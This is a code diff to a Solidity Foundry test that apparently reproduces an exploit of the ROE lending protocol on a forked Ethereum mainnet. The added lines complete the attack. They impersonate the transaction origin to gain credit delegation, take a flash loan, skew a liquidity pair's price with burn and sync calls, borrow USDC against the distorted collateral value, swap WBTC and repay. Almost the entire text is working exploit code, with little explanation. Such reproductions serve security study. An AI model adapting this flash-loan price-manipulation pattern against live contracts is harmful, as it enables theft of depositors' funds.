@@ -14,6 +14,7 @@ interface ROE {
         address onBehalfOf,
         uint16 referralCode
     ) external;
+
     function borrow(
         address asset,
         uint256 amount,
@@ -44,6 +45,7 @@ contract ContractTest is Test {
     uint256 flashLoanAmount = 5_673_090_338_021;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+
     function setUp() public {
         cheats.createSelectFork("mainnet", 16_384_469);
         cheats.label(address(roe), "ROE");
@@ -54,8 +56,8 @@ contract ContractTest is Test {
 
     function testExploit() public {
         cheats.startPrank(tx.origin);
-        //LP.approveDelegation(address(this), type(uint256).max);
-        //cheats.stopPrank();
+        LP.approveDelegation(address(this), type(uint256).max);
+        cheats.stopPrank();
         address[] memory tokens = new address[](1);
         tokens[0] = address(USDC);
         uint256[] memory amounts = new uint256[](1);
@@ -87,6 +89,18 @@ contract ContractTest is Test {
         Pair.transfer(address(Pair), borrowAmount);
         Pair.burn(address(this));
         USDC.transfer(address(Pair), 26_025 * 1e6);
-        
+        Pair.sync();
+        roe.borrow(address(USDC), flashLoanAmount, 2, 0, address(this));
+        WBTCToUSDC();
+        USDC.transfer(address(balancer), flashLoanAmount);
+    }
+    function WBTCToUSDC() internal {
+        WBTC.approve(address(Router), type(uint256).max);
+        address[] memory path = new address[](2);
+        path[0] = address(WBTC);
+        path[1] = address(USDC);
+        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp
+        );
     }
 }
